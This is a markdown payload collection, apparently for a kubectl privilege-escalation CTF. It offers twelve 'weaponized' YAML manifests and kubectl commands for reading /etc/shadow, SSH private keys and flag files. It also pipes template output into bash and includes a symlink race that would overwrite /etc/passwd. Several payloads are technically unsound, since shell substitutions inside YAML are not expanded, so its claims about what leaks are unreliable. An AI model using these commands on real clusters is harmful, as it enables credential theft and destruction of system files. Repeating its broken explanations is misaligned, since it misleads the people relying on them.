

# 🧨 Evil YAML Payload Arsenal (Kubectl CTF Edition), (..RC1..)

This is a companion to the Kubectl PrivEsc compendium.
Dedicated collection of **weaponized YAML manifests** to exploit parsing quirks, file reading, injection, and error leaks.

---

## 📑 Table of Contents

1. Metadata Injection
2. API Version Abuse
3. Resource Name Injection
4. Multi-Doc Manifests
5. ConfigMap Data Injection
6. Go-Template Outputs
7. JSON Patch Abuse
8. Invalid Schema Exploitation
9. CRD Fuzzing Payloads
10. Error Reflection Tricks
11. Helm-Style Templating Injections
12. TOCTOU YAML Mischief

---

## 1. Metadata Injection

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-$(cat /etc/passwd)
spec:
  containers:
  - name: c
    image: busybox
    command: ["sleep","infinity"]
```

➡ Dumps file contents into object name (shows up in error messages or events).

---

## 2. API Version Abuse

```yaml
apiVersion: $(cat /root/flag)
kind: Pod
metadata:
  name: api-abuse
```

➡ Invalid API versions get echoed back by the server.

---

## 3. Resource Name Injection

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: $(cat /root/.ssh/id_rsa)
data:
  foo: bar
```

➡ Injects file contents into the resource name field.

---

## 4. Multi-Doc Manifests

```yaml
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: loot
data:
  secret: |
    $(cat /target/file)
---
apiVersion: v1
kind: Pod
metadata:
  name: companion
```

➡ Leaks file contents inside ConfigMap data while still being valid YAML.

---

## 5. ConfigMap Data Injection

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: dump
data:
  payload: !!binary |
    $(base64 /etc/shadow)
```

➡ Encodes arbitrary file as base64 inside YAML.

---

## 6. Go-Template Outputs

```bash
sudo kubectl create cm evil --from-literal=data='{{.}}' \
  --dry-run=client -o go-template='{{.data}}' | bash
```

➡ Executes go-template injection via output rendering.

---

## 7. JSON Patch Abuse

```bash
sudo kubectl patch cm loot --type='json' \
  -p="[{'op':'add','path':'/data/loot','value':'$(cat /etc/passwd)'}]" --dry-run=client
```

➡ Forces file contents into patch data.

---

## 8. Invalid Schema Exploitation

```yaml
apiVersion: v1
kind: /etc/passwd
metadata:
  name: invalid-schema
```

➡ Causes error responses reflecting your injected file path.

---

## 9. CRD Fuzzing Payloads

```yaml
apiVersion: custom.io/v1
kind: CustomThing
metadata:
  name: fuzz-obj
spec:
  injected: $(cat /flag)
```

➡ Abuses CRDs with permissive schemas to smuggle data.

---

## 10. Error Reflection Tricks

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - name: x
    image: busybox
    command: ["sh","-c","echo $(cat /etc/hosts) && false"]
```

➡ Crashes container, leaks file contents into logs/events.

---

## 11. Helm-Style Templating Injections

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: helm-trick
data:
  tpl: |
    {{ .Files.Get "/etc/passwd" }}
```

➡ In Helm contexts, `.Files.Get` reads host files into manifests.

---

## 12. TOCTOU YAML Mischief

```bash
ln -sf /etc/passwd /tmp/race.yaml
sudo kubectl apply -f /tmp/race.yaml &
sleep 0.2 && echo 'apiVersion: v1' > /tmp/race.yaml
```

➡ Exploits time-of-check-time-of-use to inject files as YAML.

---

# 🎯 Usage Notes

* Test with `kubectl apply -f evil.yaml --dry-run=client` to avoid cluster spam.
* Most payloads are about **reflective leaks**: server errors, client validation, and object names echoing back injected data.
* Combine with proxy/file-serving tricks to chain discovery → exfiltration.

##
##
